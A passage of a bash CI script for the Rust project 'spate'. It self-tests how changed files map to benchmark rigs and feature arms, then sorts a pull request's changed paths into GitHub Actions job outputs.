    fixture=$(mktemp -d)
    trap 'rm -rf "$fixture"' EXIT
    mkdir -p "$fixture/crates/spate-core" "$fixture/crates/spate-kafka" \
        "$fixture/crates/spate-json" "$fixture/crates/spate-s3" \
        "$fixture/crates/spate-avro" "$fixture/crates/spate-coordination" \
        "$fixture/benchmarks/src/bin" "$fixture/benchmarks/src/dirmod"
    # A module that lives in a directory rather than beside its siblings.
    cat >"$fixture/benchmarks/src/dirmod/mod.rs" <<'FIXDIR'
pub fn run() { let _ = spate_coordination::Store; }
FIXDIR
    # The crate root is linked into every rig, so a crate named only here is
    # reached by all of them. Named nowhere else in the fixture.
    cat >"$fixture/benchmarks/src/lib.rs" <<'FIXLIB'
pub mod wrapped;
pub mod reached;
pub fn env_str() { let _ = spate_avro::Decoder; }
FIXLIB
    # Reached only through a wrapped brace group, and names a crate nowhere
    # else in the fixture.
    cat >"$fixture/benchmarks/src/wrapped.rs" <<'FIXWRAP'
use crate::reached::helper;
pub fn go() { let _ = spate_json::Framer; helper(); }
FIXWRAP
    # Reached only from another shared module, as `crate::reached`.
    cat >"$fixture/benchmarks/src/reached.rs" <<'FIXREACH'
pub fn helper() { let _ = spate_s3::Source; }
FIXREACH
    cat >"$fixture/benchmarks/src/bin/fixture.rs" <<'FIXBIN'
//! Unlike [`spate_kafka::KafkaSource`], this rig needs no broker.
/* An earlier draft called spate_kafka::Producer here.
   It spans lines, as a disabled block does. */
use benchmarks::{
    dirmod,
    env_str,
    wrapped,
};
fn main() { let _ = spate_core::Pipeline; env_str(); wrapped::go(); dirmod::run(); }
FIXBIN
    fixture_got=$(rig_named_crates fixture "$fixture" | sort | tr '\n' ' ')
    fixture_got="${fixture_got% }"
    if [[ "$fixture_got" != "spate-avro spate-coordination spate-core spate-json spate-s3" ]]; then
        echo "::error::the source walk answered '$fixture_got' for the fixture rig, want 'spate-avro spate-coordination spate-core spate-json spate-s3'."
        echo "spate-kafka appearing means a doc comment was read as a reference; a missing"
        echo "spate-json means a wrapped use-group was dropped; a missing spate-s3 means a"
        echo "crate-relative edge between shared modules was not followed; a missing"
        echo "spate-avro means the crate root was not treated as linked into every rig."
        exit 1
    fi
    rm -rf "$fixture"
    trap - EXIT

    # The dependency closure is not feature-aware: `cargo metadata --no-deps`
    # reports an optional dependency the same as a required one, so the facade
    # reaches every connector it can enable. Nothing is wrong while no rig
    # names the facade, and this says so rather than leaving the first rig
    # written against the public API to surface as an unrelated red check —
    # "every rig exercising it needs infrastructure", which is not what would
    # have gone wrong.
    for rig in "${WALLCLOCK_RIGS[@]}"; do
        if grep -qxF spate <<<"$(rig_named_crates "$rig")"; then
            echo "::error::rig '$rig' names the spate facade, whose optional connector dependencies are all in its closure."
            echo "Make the closure feature-aware before a rig reaches a connector through the facade."
            exit 1
        fi
    done

    # Built once and passed down, exactly as the dispatch path does it.
    map=$(rig_crate_map) || exit 1

    # spate-core reaches everything, here as above — asserted against the map
    # rather than through `wallclock_rigs_for`, which short-circuits on that
    # crate before reading a row. Comparing its output to WALLCLOCK_RIGS put
    # the same array on both sides and could not fail for any map.
    for rig in "${WALLCLOCK_RIGS[@]}"; do
        reached=$(printf '%s' "$map" | sed -n "s/^$rig$(printf '\t')//p")
        if ! grep -qxF spate-core <<<"$(printf '%s\n' "$reached" | tr ' ' '\n')"; then
            echo "::error::rig '$rig' does not reach spate-core, which every rig links."
            exit 1
        fi
    done

    # And a crate whose every rig needs infrastructure selects none of them.
    # Two cases, and both would be easy to get wrong by reading `use` lines:
    # spate-kafka's rigs all need a broker, spate-clickhouse's all need a
    # server.
    for crate in spate-kafka spate-clickhouse; do
        if [[ -n "$(wallclock_rigs_for "$crate" "$map")" ]]; then
            echo "::error::wallclock_rigs_for($crate) selects a rig, but every rig exercising it needs infrastructure."
            exit 1
        fi
    done

    # The closure, not just the naming. `s3_backfill` names spate-s3, which
    # depends on spate-coordination and builds a memory store unconditionally —
    # so coordination code runs on every backfill and a change to it must drive
    # the rig, though the rig mentions it nowhere.
    #
    # Captured, not piped into `grep -q`: under `pipefail` a `-q` that exits on
    # the first match kills the producer with SIGPIPE and the pipeline reports
    # 141. That is not hypothetical here — promoting a fourth rig makes this
    # producer write again after the match, and the check then fails on the
    # exact change it was written to permit. No check below uses that shape.
    coord_rigs=$(wallclock_rigs_for spate-coordination "$map")
    if ! grep -qxF s3_backfill <<<"$coord_rigs"; then
        echo "::error::a spate-coordination change must drive s3_backfill — spate-s3 depends on it."
        exit 1
    fi

    # A dev-dependency is linked into a test or a bench, never the rig binary.
    if [[ -n "$(wallclock_rigs_for spate-test "$map")" ]]; then
        echo "::error::spate-test is a dev-dependency; it cannot move a rig binary."
        exit 1
    fi

    # The mapping is derived from what a rig NAMES, not from what it imports.
    # `s3_backfill` reaches `spate_json::NdjsonFramer` through a path
    # expression and imports it nowhere, so an import-based table would miss
    # this and a spate-json change would never drive the backfill.
    json_rigs=$(wallclock_rigs_for spate-json "$map")
    if ! grep -qxF s3_backfill <<<"$json_rigs"; then
        echo "::error::a spate-json change must drive s3_backfill — it frames with NdjsonFramer."
        exit 1
    fi

    # The narrow case, which is the whole point: a crate drives the rigs that
    # name it and no others. Asserted as that property rather than as today's
    # exact set — pinning the set would turn a legitimate promotion (see #89)
    # into a red check, which is the shape of guard that gets deleted rather
    # than fixed.
    s3_rigs=$(wallclock_rigs_for spate-s3 "$map")
    if ! grep -qxF s3_backfill <<<"$s3_rigs"; then
        echo "::error::a spate-s3 change must drive s3_backfill."
        exit 1
    fi
    for rig in $(printf '%s\n' "$s3_rigs"); do
        reached=$(printf '%s' "$map" | sed -n "s/^$rig\t//p")
        reached_lines=$(printf '%s\n' "$reached" | tr ' ' '\n')
        if ! grep -qxF spate-s3 <<<"$reached_lines"; then
            echo "::error::wallclock_rigs_for(spate-s3) selects '$rig', which does not reach spate-s3."
            exit 1
        fi
    done
    for rig in deser_formats pipeline_synthetic; do
        if grep -qxF "$rig" <<<"$s3_rigs"; then
            echo "::error::a spate-s3 change must not drive '$rig' — it names no spate-s3."
            exit 1
        fi
    done

    # The path arms, driven through `wallclock_crate_for_path` — the same
    # function the dispatch calls, not a copy of its `case`. A copy passed this
    # check while the real arms drifted, which is how deleting one of them from
    # the dispatch left `--self-test` green.
    #
    # Each pair is a changed path and the crate it must attribute to — the
    # attribution, not the rig set. Which rigs a crate drives is asserted as a
    # property above; restating today's set here would turn a legitimate
    # promotion (see #89) into a red check, which is the shape of guard that
    # gets deleted rather than fixed. The empty answers carry the same weight
    # as the others: the results-before-benchmarks ordering is asserted here
    # because `*` matches `/` in a bash case, and getting it wrong makes
    # recording a dataset drive everything.
    while IFS='|' read -r probe want; do
        [[ -n "$probe" ]] || continue
        got=$(wallclock_crate_for_path "$probe" "$repo_root")
        if [[ "$got" != "$want" ]]; then
            echo "::error::path '$probe' attributes to '$got', want '$want'."
            exit 1
        fi
    done <<PATHS
crates/spate-s3/src/lib.rs|spate-s3
crates/spate-coordination/src/lib.rs|spate-coordination
crates/spate-clickhouse/src/lib.rs|spate-clickhouse
crates/etl-s3/src/source.rs|spate-core
benchmarks/results/s3-backfill.jsonl|
benchmarks/src/bin/s3_backfill.rs|spate-core
scripts/ci-changes.sh|spate-core
scripts/bench-compare.sh|spate-core
scripts/bench-drive.sh|spate-core
Makefile|spate-core
.github/workflows/scheduled.yml|spate-core
.github/actions/setup-rust/action.yml|spate-core
Cargo.lock|spate-core
Cargo.toml|spate-core
deny.toml|spate-core
rust-toolchain.toml|spate-core
.cargo/config.toml|spate-core
.config/nextest.toml|spate-core
docs/DESIGN.md|
README.md|
scripts/attribution.sh|
PATHS

    # And end to end, for the two answers that hold whatever the runnable set
    # becomes: an apparatus path drives every rig, a docs or dataset path
    # drives none. Both are derived, so a promotion moves them with it.
    all_rigs=$(printf '%s\n' "${WALLCLOCK_RIGS[@]}" | sort | tr '\n' ' ')
    all_rigs="${all_rigs% }"
    while IFS='|' read -r probe want; do
        [[ -n "$probe" ]] || continue
        [[ "$want" != "@ALL" ]] || want="$all_rigs"
        probe_crate=$(wallclock_crate_for_path "$probe" "$repo_root")
        got=""
        if [[ -n "$probe_crate" ]]; then
            got=$(wallclock_rigs_for "$probe_crate" "$map" | sort | tr '\n' ' ')
            got="${got% }"
        fi
        if [[ "$got" != "$want" ]]; then
            echo "::error::path '$probe' selects '$got', want '$want'."
            exit 1
        fi
    done <<ENDTOEND
scripts/ci-changes.sh|@ALL
Makefile|@ALL
.github/actions/setup-rust/action.yml|@ALL
Cargo.lock|@ALL
benchmarks/results/s3-backfill.jsonl|
docs/DESIGN.md|
ENDTOEND

    # spate-core reaches every count, so it selects every benched crate.
    core_pkgs=$(bench_pkgs_for spate-core | tr '\n' ' ')
    core_pkgs="${core_pkgs% }"
    if [[ "$core_pkgs" != "$all_pkgs" ]]; then
        echo "::error::bench_pkgs_for(spate-core) selects '$core_pkgs', not every benched crate."
        echo "Crates with benches: $all_pkgs"
        exit 1
    fi

    # Every other benched crate selects exactly itself — not the whole set,
    # which would put every crate's valgrind runs on every pull request.
    while IFS= read -r crate; do
        [[ -n "$crate" && "$crate" != "spate-core" ]] || continue
        selected=$(bench_pkgs_for "$crate" | tr '\n' ' ')
        if [[ "${selected% }" != "$crate" ]]; then
            echo "::error::bench_pkgs_for('$crate') selects '${selected% }', not just itself."
            exit 1
        fi
    done <<<"$discovered"

    # And a crate with no bench selects nothing, so an ordinary change to one
    # does not pay for a measurement that would report on code it did not
    # touch. Checked against the tree, and against a name that is in no tree at
    # all — the `*` arm has to answer both with silence.
    #
    # spate-core is exempt, and not as a convenience: its rule is about what a
    # change to it can reach, not about what it owns, so it selects every
    # benched crate whether or not it has one of its own. Without the exemption
    # this loop would fail a tree where spate-core's bench had been deleted, and
    # blame the wrong rule for it.
    for dir in "$repo_root"/crates/*/; do
        crate=$(basename "$dir")
        [[ "$crate" != "spate-core" ]] || continue
        has_gungraun_bench "$crate" && continue
        if [[ -n "$(bench_pkgs_for "$crate")" ]]; then
            echo "::error::bench_pkgs_for('$crate') selects something, but '$crate' has no bench."
            exit 1
        fi
    done
    if [[ -n "$(bench_pkgs_for __no_such_crate__)" ]]; then
        echo "::error::bench_pkgs_for() selects something for a crate that does not exist."
        exit 1
    fi
    # A crate name reaches here from a changed path, and a branch may legally
    # contain a directory called `crates/spate-*/`. Matched as data it selects
    # nothing; matched as a pattern it would select every benched crate.
    if [[ -n "$(bench_pkgs_for 'spate-*')" ]]; then
        echo "::error::bench_pkgs_for() treats a crate name as a glob, not as data."
        exit 1
    fi

    # ------------------------------------------------------------------
    # The feature-arm table and the matrix built from it.
    #
    # The table is the one hand-written thing in the selection path, and each
    # check below catches a mistake that would otherwise surface as a burnt
    # shard, a corrupt matrix, or two rows in the report that cannot be told
    # apart.
    # ------------------------------------------------------------------
    arm_failed=0

    # Every feature key cargo knows about, per package. `default` is in this
    # map only for packages that declare one, which is exactly why the arm
    # *label* `default` is not passed to `--features`.
    feature_map=$(mktemp)
    echo "$metadata" | python3 -c '
import json, sys
for p in json.load(sys.stdin)["packages"]:
    for f in sorted(p["features"]):
        print("{}\t{}".format(p["name"], f))
' >"$feature_map"

    multi_arm=0
    while IFS= read -r crate; do
        [[ -n "$crate" ]] || continue
        # The package name is concatenated into the matrix JSON and into an
        # artifact name exactly as the arm label is, and it is *not* a value
        # this file chooses — it comes from a directory name under `crates/`,
        # which a branch controls. Checked here so the concatenation below is
        # safe by assertion rather than by cargo's naming rules happening to
        # be narrower than JSON's.
        if [[ ! "$crate" =~ ^[A-Za-z0-9_.-]+$ ]]; then
            echo "::error::package name '$crate' carries a character that cannot go unescaped into the matrix JSON or an artifact name."
            arm_failed=1
        fi
        arms=$(feature_arms_for "$crate")
        if [[ -z "$arms" ]]; then
            echo "::error::feature_arms_for('$crate') names no arm; a benched crate needs at least the default one."
            arm_failed=1
            continue
        fi
        arm_count=0
        default_arms=0
        seen_labels=""
        while read -r label feats; do
            [[ -n "$label" ]] || continue
            arm_count=$((arm_count + 1))
            # The label is concatenated into JSON and into an artifact name,
            # neither of which is escaped. Constraining it here is what makes
            # that concatenation safe rather than lucky.
            if [[ ! "$label" =~ ^[A-Za-z0-9_.,-]+$ ]]; then
                echo "::error::arm label '$label' on '$crate' carries a character that cannot go unescaped into the matrix JSON or an artifact name."
                arm_failed=1
            fi
            if [[ " $seen_labels " == *" $label "* ]]; then
                echo "::error::'$crate' declares the arm label '$label' twice; the two shards would stamp themselves identically and their rows could not be told apart."
                arm_failed=1
            fi
            seen_labels="$seen_labels $label"
            if [[ -z "$feats" ]]; then
                default_arms=$((default_arms + 1))
            else
                IFS=',' read -ra arm_feats <<<"$feats"
                for arm_feat in "${arm_feats[@]}"; do
                    if ! grep -qxF "$crate"$'\t'"$arm_feat" "$feature_map"; then
                        echo "::error::'$crate' has no feature '$arm_feat', but the arm table names it."
                        echo "Cargo would fail the shard with 'the package does not contain this feature'."
                        arm_failed=1
                    fi
                done
            fi
        done <<<"$arms"
        # Exactly one arm builds with no `--features` flag. Two of them would
        # be the same build measured twice under two labels; none of them
        # would leave the unmodified crate unmeasured.
        if [[ "$default_arms" -ne 1 ]]; then
            echo "::error::'$crate' declares $default_arms arm(s) with no feature list; exactly one (the default build) is required."
            arm_failed=1
        fi
        [[ "$arm_count" -le 1 ]] || multi_arm=1
    done <<<"$discovered"
    rm -f "$feature_map"

    # The axis has to be load-bearing somewhere. If every crate is measured
    # under one arm, the matrix has grown a dimension of size one everywhere
    # and the second build the whole shape exists for is not happening —
    # which is a green run measuring less than it claims, the failure this
    # tier keeps having.
    if [[ "$multi_arm" -eq 0 ]]; then
        echo "::error::no benched crate is measured under more than one feature arm."
        echo "The (package, arm) matrix has no second arm anywhere; see feature_arms_for()."
        arm_failed=1
    fi

    # The emitted document, checked as a document: `fromJSON` in ci.yml turns
    # a malformed one into a workflow-level error with no job to attribute it
    # to, and a duplicated (package, arm) into two shards racing for one
    # artifact name.
    if ! SHARDS="$(bench_shards_json "$all_pkgs")" python3 -c '
import json, os, sys

rows = json.loads(os.environ["SHARDS"])
if not rows:
    sys.exit("the matrix is empty")
for row in rows:
    if set(row) != {"package", "arm", "cargo_features"}:
        sys.exit("unexpected keys in {!r}".format(row))
keys = [(r["package"], r["arm"]) for r in rows]
if len(set(keys)) != len(keys):
    sys.exit("duplicate (package, arm) in {!r}".format(keys))
'; then
        echo "::error::the emitted bench matrix is not the shape ci.yml's strategy.matrix.include reads."
        arm_failed=1
    fi
    [[ "$arm_failed" == "0" ]] || exit 1

    # What each path arm selects. The checks above cannot see this: they test
    # the selection functions, and the arms are what consult them. Every row
    # here is a rule stated in prose somewhere — in the comments below, in
    # CONTRIBUTING.md or in the CI reference — so a rule that stops holding
    # fails here instead of going quietly false in three documents at once.
    path_case_failed=0
    #
    # `$2` is still a package list, and the expectation is the matrix that
    # list crosses to. The arm table is not what these cases test — the checks
    # above own it — so reusing it to build the expectation keeps each case
    # readable as "which crates does this path select", which is the rule each
    # one states.
    check_paths() {
        local want_bench="$1" want_pkgs="$2" desc="$3"
        shift 3
        local list out got_bench got_pkgs
        want_pkgs=$(bench_shards_json "$want_pkgs")
        list=$(mktemp)
        out=$(mktemp)
        printf '%s\0' "$@" >"$list"
        # A subprocess, because classification runs at the bottom of this file
        # rather than in a function. Read the answers from the child's own
        # `GITHUB_OUTPUT` rather than its stdout: the classifier `tee`s to both,
        # so stdout carries every line twice when the variable is unset. Giving
        # it a temporary file also keeps synthetic answers out of the calling
        # job's real output. `PR_LABELS` and `EVENT_NAME` are unset so that
        # neither a label nor an event can decide what the arms should.
        env -u PR_LABELS -u EVENT_NAME GITHUB_OUTPUT="$out" \
            "$0" --classify-paths "$list" >/dev/null
        got_bench=$(sed -n 's/^bench=//p' "$out")
        got_pkgs=$(sed -n 's/^bench-shards=//p' "$out")
        rm -f "$list" "$out"
        if [[ "$got_bench" != "$want_bench" || "$got_pkgs" != "$want_pkgs" ]]; then
            echo "::error::$desc: expected bench=$want_bench bench-shards='$want_pkgs',"
            echo "got bench=$got_bench bench-shards='$got_pkgs' for: $*"
            path_case_failed=1
        fi
    }

    # The sample crates are derived, not named: naming one would put this file
    # back in the path of every pull request that adds or removes a bench,
    # which is the coupling the derivation exists to remove. Expectations stay
    # exact — what varies is which crate stands for each rule, not what the arm
    # is allowed to answer.
    benched_a="" benched_b="" unbenched=""
    while IFS= read -r crate; do
        [[ -n "$crate" && "$crate" != "spate-core" ]] || continue
        if [[ -z "$benched_a" ]]; then
            benched_a="$crate"
        elif [[ -z "$benched_b" ]]; then
            benched_b="$crate"
        fi
    done <<<"$discovered"
    for dir in "$repo_root"/crates/*/; do
        crate=$(basename "$dir")
        # Exempt for the same reason as the loop above: spate-core selects every
        # benched crate whether or not it owns one, so it cannot stand for the
        # crate that selects nothing.
        [[ "$crate" != "spate-core" ]] || continue
        has_gungraun_bench "$crate" && continue
        unbenched="$crate"
        break
    done

    check_paths true "$all_pkgs" "the core crate selects every benched crate" \
        crates/spate-core/src/lib.rs
    if [[ -n "$benched_a" ]]; then
        check_paths true "$benched_a" "a benched crate selects itself" \
            "crates/$benched_a/src/lib.rs"
    fi
    if [[ -n "$benched_b" ]]; then
        # Discovery is sorted and so is the emitted list, so taking the first
        # two in order needs no second sort here.
        check_paths true "$benched_a $benched_b" "two benched crates select both" \
            "crates/$benched_a/src/lib.rs" "crates/$benched_b/src/lib.rs"
    fi
    if [[ -n "$unbenched" ]]; then
        check_paths false "" "a crate without a bench selects nothing" \
            "crates/$unbenched/src/lib.rs"
    fi
    check_paths false "" "docs select nothing" docs/DESIGN.md
    # Every file that can change what the counter tier measures, in the same
    # order as the `case` arm it mirrors. A file added to one and not the other
    # silently stops forcing a full re-measurement, which is how a change to
    # the apparatus lands unmeasured.
    for apparatus in scripts/ci-changes.sh scripts/gungraun-benches.sh \
        scripts/gungraun-report.sh scripts/gungraun-collected-region.sh \
        .github/workflows/ci.yml .github/actions/setup-rust/action.yml; do
        check_paths true "$all_pkgs" "$apparatus selects every benched crate" \
            "$apparatus"
    done
    [[ "$path_case_failed" == "0" ]] || exit 1

    echo "container_suites_for() matches the crate graph, CONTAINER_PKGS matches the tree,"
    echo "the label overrides are additive, bench selection follows what the benches"
    echo "discover, every feature arm names a feature its package declares, and each"
    echo "path arm selects the crates it claims to."
    exit 0
fi

# ---------------------------------------------------------------------------
# Collect the changed paths.
# ---------------------------------------------------------------------------
force_all=0
changed_file=$(mktemp)
trap 'rm -f "$changed_file"' EXIT

# `--classify-paths FILE` classifies a NUL-separated list given on the command
# line instead of a diff, so `--self-test` can assert what each arm below
# selects. It is an argument rather than an environment variable deliberately:
# an exported variable could turn a real classification into a synthetic one by
# accident, and an argument cannot arrive that way. The sentinel is hyphenated
# so no webhook event name can collide with it — GitHub's are underscored.
mode="${EVENT_NAME:-}"
if [[ "${1:-}" == "--classify-paths" ]]; then
    if [[ -z "${2:-}" || ! -r "${2:-}" ]]; then
        echo "--classify-paths needs a readable file of NUL-separated paths" >&2
        exit 2
    fi
    cat "$2" >"$changed_file"
    mode=classify-paths
fi

case "$mode" in
classify-paths)
    # The list is already in place; skip the diff entirely.
    ;;
pull_request)
    # Against the *merge base*, not the base branch tip. `base.sha` is the tip,
    # so a two-dot diff also reports everything main has gained since this
    # branch last moved — on an active repository that is most of the time, and
    # the scoping quietly stops applying.
    #
    # `--no-renames` because rename detection prints only the destination path:
    # `git mv crates/spate-s3/src/foo.rs docs/foo.rs` would otherwise look like a
    # docs-only change while deleting compiled source. That is a fail-*open*,
    # which is the one failure mode this classifier is built to avoid.
    #
    # `-z` because `core.quotePath` defaults to true, so a non-ASCII path is
    # emitted C-quoted (`"docs/caf\303\251.mdx"`) and matches none of the
    # patterns below. NUL-separated output cannot survive a command
    # substitution, hence the temporary file.
    if ! merge_base=$(git merge-base "${BASE_SHA:-}" "${HEAD_SHA:-}" 2>/dev/null) ||
        [[ -z "$merge_base" ]]; then
        echo "note: no merge base for ${BASE_SHA:-?}..${HEAD_SHA:-?}; running everything."
        force_all=1
    elif ! git diff --no-ext-diff --no-textconv --name-only -z --no-renames \
        "$merge_base" "${HEAD_SHA}" >"$changed_file" 2>/dev/null; then
        echo "note: could not diff ${merge_base}..${HEAD_SHA}; running everything."
        force_all=1
    fi
    ;;
*)
    # push, merge_group, schedule, workflow_dispatch. A merge queue entry has no
    # pull-request diff to reason about, and a push to main is the last line of
    # defence. Both get the full suite; correctness beats minutes here.
    force_all=1
    ;;
esac

# ---------------------------------------------------------------------------
# Classify.
# ---------------------------------------------------------------------------
rust=false
site=false
bench=false
bench_pkgs=""
suites=""

if [[ "$force_all" == "1" ]]; then
    rust=true
    site=true
    bench=true
    bench_pkgs=$(all_bench_pkgs)
    suites="$CONTAINER_PKGS"
else
    # Fill the discovery cache here, in the parent shell: the loop below asks
    # `bench_pkgs_for` about every changed crate from inside a command
    # substitution, and a subshell cannot write the answer back.
    discover_bench_pkgs
    while IFS= read -r -d '' file; do
        [[ -z "$file" ]] && continue

        # First match wins, and the order is load-bearing. In a bash `case`
        # pattern `*` matches `/` as well, so a bare `*.md` arm would also
        # swallow crates/spate/README.md — and a crate README can be compiled
        # into the library with `#![doc = include_str!(...)]`. Claiming the
        # source trees first is what keeps the prose arm honest.
        case "$file" in
        # Committed benchmark datasets are chart data the site reads at build
        # time, not code.
        benchmarks/results/*)
            site=true
            continue
            ;;
        # Source trees: always code, whatever the file extension. Empty body,
        # so control falls past the `case` to the classification below.
        crates/* | benchmarks/* | scripts/*) ;;
        # CI definitions decide what every other job does, so a change to one
        # has to be exercised by the full set.
        .github/workflows/* | .github/actions/*) ;;
        # The rest of `.github/` cannot reach a Rust build or the site.
        # Dependabot config and issue templates are still audited, because
        # zizmor scans all of `.github/` and never carries a filter.
        .github/*)
            continue
            ;;
        # --- documentation and site sources: no Rust build needed ------------
        docs/* | website/*)
            site=true
            continue
            ;;
        # Root-level prose and repo furniture.
        *.md | LICENSE | .gitignore | .dockerignore)
            continue
            ;;
        esac

        # --- everything else is code ----------------------------------------
        rust=true

        # Which container suites can this file reach?
        case "$file" in
        crates/*)
            crate="${file#crates/}"
            crate="${crate%%/*}"
            suites="$suites $(container_suites_for "$crate")"
            ;;
        # A dependency or lint change moves the whole graph. So does a change to
        # the workflows, the composite action, the Makefile the workflow steps
        # call, or this script — the last one decides what runs at all, so it
        # has to prove itself against everything.
        Cargo.lock | Cargo.toml | deny.toml | rust-toolchain.toml | .config/* | \
            .github/workflows/* | .github/actions/* | scripts/* | Makefile)
            suites="$suites $CONTAINER_PKGS"
            site=true
            ;;
        esac

        # Which files can move an instruction count, and whose benches
        # should run because of it? The unit is the whole crate, not the
        # module a bench happens to import, because codegen is crate-global —
        # an edit anywhere in a measured crate can shift inlining and with it
        # the count.
        #
        # `bench_pkgs_for` answers from what the benches discover: a benched
        # crate selects itself, spate-core selects every benched crate because
        # every crate depends on it, and a crate with no bench selects nothing.
        # Adding a bench wires it into pull-request selection without an edit
        # here, which is what keeps this file from naming a subset of the
        # benches that exist.
        #
        # Cost is bounded by the reach of the change rather than by a list: a
        # change confined to one benched crate pays for that crate's two builds
        # and two valgrind runs, and only a change to the crate everything
        # depends on pays for all of them. The `ci: bench` label is still how a
        # path that selects less asks for the full set.
        #
        # A separate `case` rather than arms on the one above, because the
        # two questions have different answers for the same file.
        case "$file" in
        crates/*)
            crate="${file#crates/}"
            crate="${crate%%/*}"
            selected=$(bench_pkgs_for "$crate")
            if [[ -n "$selected" ]]; then
                bench=true
                bench_pkgs="$bench_pkgs $selected"
            fi
            ;;
        # The measuring apparatus itself. A change to what gets discovered,
        # which crates are chosen, how the results are read, or the job that
        # drives them can alter the outcome for every crate, so it selects all
        # of them. This file is on the list because it is the chooser: an edit
        # here can leave every later pull request measuring the wrong set.
        #
        # This is not symmetry for its own sake: without it, the pull request
        # that rewrites how benches are chosen is precisely the one that never
        # runs them. That happened — the change introducing the discovery
        # script landed its bench job as `skipped`, because the paths that
        # force the whole container graph do not touch `bench`, and nothing
        # said so.
        #
        # `.github/actions/` is on the list because the shared build cache is
        # configured there, and which cache a shard restores decides whether it
        # compiles the bench graph from scratch — a change that can move every
        # crate's job, without touching a crate.
        scripts/ci-changes.sh | scripts/gungraun-benches.sh | \
            scripts/gungraun-report.sh | scripts/gungraun-collected-region.sh | \
            .github/workflows/ci.yml | .github/actions/*)
            bench=true
            bench_pkgs="$bench_pkgs $(all_bench_pkgs)"
            ;;
        esac
    done <"$changed_file"
fi

# A dependency bump touches Cargo.lock, which by the rule above reaches every
# container suite — so an unmodified Dependabot week would boot SeaweedFS, NATS,
# Kafka and ClickHouse once per bump, and again on every rebase when a sibling
# PR merges. These pull requests keep the whole cheap tier (lint, deny, the full
# test suite, each-feature, MSRV) and give up only the container suites, which
# the push-to-main run re-runs in full minutes after the merge.
if [[ "${PR_AUTHOR:-}" == "dependabot[bot]" && "${EVENT_NAME:-}" == "pull_request" ]]; then
    echo "note: dependabot pull request; container suites deferred to push-to-main."
    suites=""
fi

# The release pull request release-plz keeps open against `main` is the same
# trade at a better price. Its whole diff is `Cargo.toml` and `Cargo.lock`, which
# the dependency rule above answers with every container suite — so the cheapest
# diff this classifier ever sees gets the most expensive classification it has.
# And it gets it repeatedly: release-plz rewrites that branch on every push to
# `main`, so the boots are paid once per merge, not once per release.
#
# The safety argument is stronger here than for Dependabot. A bump changes real
# dependency code; this branch's source tree is byte-identical to the `main`
# commit that just ran the container suites on push. What is new is version
# strings, and what those can break is covered without a container: an
# inconsistent `=` internal pin or a lock file stale against the manifests fails
# the lint, test, MSRV and each-feature tiers, all of which run `--locked`, and
# the public-API diff is `semver_check` in release-plz.toml, which runs while the
# pull request is composed rather than on it.
if [[ "${PR_AUTHOR:-}" == "spate-release[bot]" && "${EVENT_NAME:-}" == "pull_request" ]]; then
    echo "note: release pull request; container suites deferred to push-to-main."
    suites=""
fi

# Applied after the deferrals above, so labelling a Dependabot or release pull
# request `ci: docker` overrides one for that one bump.
before_labels="$suites"
suites=$(apply_ci_labels "${PR_LABELS:-}" "$suites")
if [[ "$suites" != "$before_labels" ]]; then
    echo "note: 'ci: docker' label present; container suites forced on."
fi

loom=false
if ci_label_wants_loom "${PR_LABELS:-}"; then
    echo "note: 'ci: loom' label present; loom models forced on."
    loom=true
fi

if ci_label_wants_bench "${PR_LABELS:-}"; then
    echo "note: 'ci: bench' label present; instruction counts forced on."
    bench=true
    bench_pkgs=$(all_bench_pkgs)
fi

# Deduplicate: a pull request touching several files in one measured crate
# accumulates it once per file, and each duplicate would be a repeated bench
# run.
bench_pkgs_out=""
if [[ -n "${bench_pkgs// /}" ]]; then
    bench_pkgs_out=$(echo "$bench_pkgs" | tr ' ' '\n' | grep -v '^$' | sort -u | tr '\n' ' ')
    bench_pkgs_out="${bench_pkgs_out% }"
fi

# Cross the selection with the arm table. An empty `include:` is a workflow
# *error* rather than a skipped job, so the boolean and the array have to agree
# — `bench` is only ever set true alongside a non-empty selection today, and
# this keeps that true by construction rather than by inspection.
bench_shards=$(bench_shards_json "$bench_pkgs_out")
if [[ "$bench_shards" == "[]" ]]; then
    bench=false
fi

# Deduplicate and render as cargo -p arguments.
container_args=""
if [[ -n "${suites// /}" ]]; then
    for pkg in $(echo "$suites" | tr ' ' '\n' | grep -v '^$' | sort -u); do
        container_args="$container_args -p $pkg"
    done
    container_args="${container_args# }"
fi

# ---------------------------------------------------------------------------
# Emit.
# ---------------------------------------------------------------------------
{
    echo "rust=$rust"
    echo "site=$site"
    echo "containers=$([[ -n "$container_args" ]] && echo true || echo false)"
    echo "container-args=$container_args"
    echo "loom=$loom"
    echo "bench=$bench"
    # One line of JSON, and one line only: `$GITHUB_OUTPUT` is a key=value
    # file, so a multi-line value would need heredoc delimiters and a value
    # containing the delimiter is a known output-injection vector.
    echo "bench-shards=$bench_shards"
} | tee -a "${GITHUB_OUTPUT:-/dev/stdout}"
